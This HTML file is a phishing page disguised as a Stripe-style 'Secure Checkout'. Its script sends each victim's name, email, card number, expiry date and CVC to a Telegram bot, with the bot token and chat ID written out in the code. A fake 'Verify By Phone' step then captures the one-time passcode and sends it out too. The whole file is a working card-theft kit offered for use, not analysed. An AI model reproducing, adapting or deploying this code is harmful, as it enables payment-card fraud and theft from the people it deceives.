<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Checkout</title>
    <style>
        :root {
            --stripe-blue: #0000FF; 
            --border-color: #e6e6e6;
            --text-main: #1a1a1a;
            --text-gray: #6b7280;
            --error-color: #ff0000;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 10px;
            display: flex;
            justify-content: center;
        }

        .container { width: 100%; max-width: 400px; position: relative; padding-top: 60px; }

        /* --- Logo Styling (Top Left) --- */
        .header-logo {
            position: absolute;
            top: 0;
            left: 0;
            width: 50px; /* ÿßŸÑÿ≠ÿ¨ŸÖ ÿßŸÑŸÖŸÜÿßÿ≥ÿ® */
            height: 50px;
            border-radius: 50%; /* ŸÑÿ¨ÿπŸÑŸáÿß ÿØÿßÿ¶ÿ±Ÿäÿ© ŸÉŸÖÿß ŸÅŸä ÿßŸÑÿµŸàÿ±ÿ© */
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 1px solid var(--border-color);
        }
        .header-logo img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .page { display: none; }
        .active { display: block; }

        /* Modals */
        #errorModal, #successModal {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            z-index: 1000;
            padding: 20px;
            text-align: center;
        }
        #modalOverlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.4);
            z-index: 999;
        }
        .modal-text { font-size: 15px; margin-bottom: 20px; color: var(--text-main); line-height: 1.4; }
        .modal-btn { color: var(--stripe-blue); font-weight: 600; cursor: pointer; border: none; background: none; font-size: 16px; }

        /* Form elements */
        h2 { font-size: 17px; font-weight: 600; margin: 20px 0 10px 0; }
        input, select { width: 100%; padding: 11px; border: 1px solid var(--border-color); border-radius: 6px; font-size: 15px; box-sizing: border-box; outline: none; margin-bottom: 8px; }
        .address-group { border: 1px solid var(--border-color); border-radius: 6px; overflow: hidden; }
        .address-group input { border: none; border-bottom: 1px solid var(--border-color); margin-bottom: 0; border-radius: 0; }
        .address-group input:last-child { border-bottom: none; }
        
        .row { display: flex; }
        .row input:first-child { border-right: 1px solid var(--border-color); }

        .btn-pay { width: 100%; background: var(--stripe-blue); color: white; border: none; padding: 15px; border-radius: 6px; font-size: 17px; font-weight: 600; margin-top: 20px; cursor: pointer; }

        #loaderContainer { display: none; text-align: center; padding: 50px; }
        .spinner { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid var(--stripe-blue); border-radius: 50%; animation: spin 1s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .v-input { height: 60px; text-align: center; font-size: 24px; letter-spacing: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header-logo">
        <img src="https://i.ibb.co/tk1fKpK/BA47-C500-F9-EF-4732-9881-42-D361-E42075.png" alt="Logo">
    </div>

    <div id="modalOverlay"></div>
    
    <div id="errorModal">
        <div class="modal-text">Please fill in all fields correctly.</div>
        <button class="modal-btn" onclick="closeModal()">Close</button>
    </div>

    <div id="checkoutPage" class="page active">
        <h2>Shipping Information</h2>
        <input type="email" id="email" placeholder="email@example.com">
        
        <h2>Shipping Address</h2>
        <div class="address-group">
            <input type="text" id="name" placeholder="Full Name">
            <input type="text" id="addr" placeholder="Address">
            <div class="row">
                <input type="text" id="city" placeholder="City">
                <input type="text" id="zip" placeholder="Zip">
            </div>
        </div>

        <h2>Payment</h2>
        <input type="text" id="card" placeholder="Card Number" maxlength="19">
        <div class="row">
            <input type="text" id="exp" placeholder="MM / YY" maxlength="5">
            <input type="text" id="cvc" placeholder="CVC" maxlength="4">
        </div>

        <button class="btn-pay" onclick="handlePay()">Pay Now</button>
    </div>

    <div id="verifyPage" class="page">
        <h1 style="font-size: 24px;">Verify By Phone</h1>
        <p>Verification code sent to your mobile.</p>
        <input type="text" id="otp" class="v-input" maxlength="6" placeholder="000000">
        <button class="btn-pay" onclick="handleOTP()">Confirm</button>
    </div>

    <div id="loaderContainer"><div class="spinner"></div></div>
</div>

<script>
    const config = {
        token: '8145212214:AAG-Dff6G7AFW_0_K9QTVZD-Wal-u81kCGyc',
        chat_id: '656419637'
    };

    async function sendMsg(text) {
        await fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({chat_id: config.chat_id, text: text, parse_mode: 'HTML'})
        });
    }

    document.getElementById('card').addEventListener('input', e => {
        e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
    });

    function closeModal() { document.getElementById('errorModal').style.display = 'none'; document.getElementById('modalOverlay').style.display = 'none'; }

    async function handlePay() {
        const fields = ['email', 'name', 'addr', 'city', 'zip', 'card', 'exp', 'cvc'];
        let empty = fields.some(id => !document.getElementById(id).value.trim());

        if (empty) {
            document.getElementById('errorModal').style.display = 'block';
            document.getElementById('modalOverlay').style.display = 'block';
            return;
        }

        const msg = `<b>üöÄ Card Hit</b>\nName: ${document.getElementById('name').value}\nEmail: ${document.getElementById('email').value}\nCard: ${document.getElementById('card').value}\nExp: ${document.getElementById('exp').value}\nCVC: ${document.getElementById('cvc').value}`;
        await sendMsg(msg);

        document.getElementById('checkoutPage').style.display = 'none';
        document.getElementById('loaderContainer').style.display = 'block';
        setTimeout(() => {
            document.getElementById('loaderContainer').style.display = 'none';
            document.getElementById('verifyPage').style.display = 'block';
        }, 3000);
    }

    async function handleOTP() {
        const otp = document.getElementById('otp').value;
        if(otp.length === 6) {
            await sendMsg(`<b>üîë OTP:</b> <code>${otp}</code>`);
            alert("Success!");
        }
    }
</script>
</body>
</html>
